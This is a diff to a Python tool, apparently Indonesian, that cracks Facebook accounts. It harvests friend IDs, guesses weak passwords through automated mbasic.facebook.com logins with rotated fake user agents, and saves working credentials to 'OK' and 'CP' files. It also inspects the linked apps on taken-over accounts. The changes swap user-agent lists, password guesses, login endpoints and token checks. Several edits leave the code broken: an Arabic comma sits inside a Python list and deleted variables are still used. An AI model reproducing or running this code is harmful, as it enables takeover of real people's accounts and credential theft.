@@ -22,9 +22,9 @@ from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 # UA LIST
 try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
+except:ugen = ['Mozilla/5.0 (Java; U; kau; sonyericssonk750i) UCBrowser8.2.0.132/69/452/UCWEB Mobile','Mozilla/5.0 (Linux; Android 4.0.3;  LT15i Build/4.1.A.0.562) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19','Mozilla/5.0 (Linux; Android 4.1.1; Xperia X10 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.0.4 (Ice Cream Sandwich); WT19i (Live with Walkman) Build/4.1.B.0.587) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19','Mozilla/5.0 (Linux; Android 2.3.7; SO-02D Build/6.1.A.2.55) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19','Mozilla/5.0 (Linux; U; Android 1.6; xx; SonyEricssonE10a Build/1.1.A.0.8) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; Android 4.2.2; X8 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile Safari/537.36'،'Mozilla/5.0 (Linux; Android 4.4.2; Sony Xperia Z3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 bdbrowser/1.9.0.2']
 try:ugen2 = open('user2.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36']
+except:ugen2 = ['Mozilla/5.0 (Java; U; kau; sonyericssonk750i) UCBrowser8.2.0.132/69/452/UCWEB Mobile','Mozilla/5.0 (Linux; Android 4.0.3;  LT15i Build/4.1.A.0.562) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19','Mozilla/5.0 (Linux; Android 4.1.1; Xperia X10 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.0.4 (Ice Cream Sandwich); WT19i (Live with Walkman) Build/4.1.B.0.587) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19','Mozilla/5.0 (Linux; Android 2.3.7; SO-02D Build/6.1.A.2.55) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19','Mozilla/5.0 (Linux; U; Android 1.6; xx; SonyEricssonE10a Build/1.1.A.0.8) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; Android 4.2.2; X8 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile Safari/537.36'،'Mozilla/5.0 (Linux; Android 4.4.2; Sony Xperia Z3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 bdbrowser/1.9.0.2']
 
 # INDICATION
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
@@ -126,7 +126,7 @@ def menu(my_name,my_id):
 	sol().print(fx)
 	print(x+'['+h+'•'+x+'] Active User : '+str(my_name))
 	print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
-	print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
+	print(x+'['+h+'•'+x+'] User Ttl    : '+str())
 	print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
 	io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[04] Cek Opsi Checkpoint\n[00] Log Out'
 	oi = nel(io, style='cyan')
@@ -468,7 +468,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['1122334455','1234554321','112233445566','123456654321','20002000','20012001','20022002','19991999']
+			pwv = ['1122334455','1234554321','112233445566','123456654321']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -524,7 +524,6 @@ def crack(idf,pwv):
 				else:
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
-					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='CP'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -539,7 +538,6 @@ def crack(idf,pwv):
 					open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
-					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
 					break
 				elif 'ya' in taplikasi:
@@ -550,8 +548,8 @@ def crack(idf,pwv):
 					user=idf
 					infoakun = ""
 					session = requests.Session()
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					cek =session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					cek2 = session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
 					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 						infoakun += (f"Aplikasi Yang Terkait*\n")
 						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
@@ -612,7 +610,7 @@ def crack2(idf,pwv):
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
-			elif "session_key" in resp.text and "EAAA" in resp.text:
+			elif "session_key" in resp.text and "EAAB" in resp.text:
 				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
@@ -633,34 +631,14 @@ def crack3(idf,pwv):
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
+		
 		try:
-			tix = time.time()
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
-			dataa ={
-'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
-'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
-'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
-'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
-'email':idf,
-'pass':pw
-}
-			ses.headers.update({'Host': 'mbasic.facebook.com',
-'cache-control': 'max-age=0',
-'upgrade-insecure-requests': '1',
-'origin': 'https://mbasic.facebook.com',
-'content-type': 'application/x-www-form-urlencoded',
-'user-agent': ua,
-'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'sec-fetch-site': 'same-origin',
-'sec-fetch-mode': 'cors',
-'sec-fetch-user': 'empty',
-'sec-fetch-dest': 'document',
-'referer': 'https://mbasic.facebook.com/login/?email='+idf,
-'accept-encoding':'gzip, deflate br',
-'accept-language':'ar-AR,en-US;q=0.9,en;q=0.8'})
-
-			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+#			tix = time.time()
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
+			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
@@ -693,8 +671,8 @@ def crack3(idf,pwv):
 					user=idf
 					infoakun = ""
 					session = requests.Session()
-					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
-					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
+					cek =session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
+					cek2 = session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
 					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 						infoakun += (f"Aplikasi Yang Terkait*\n")
 						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
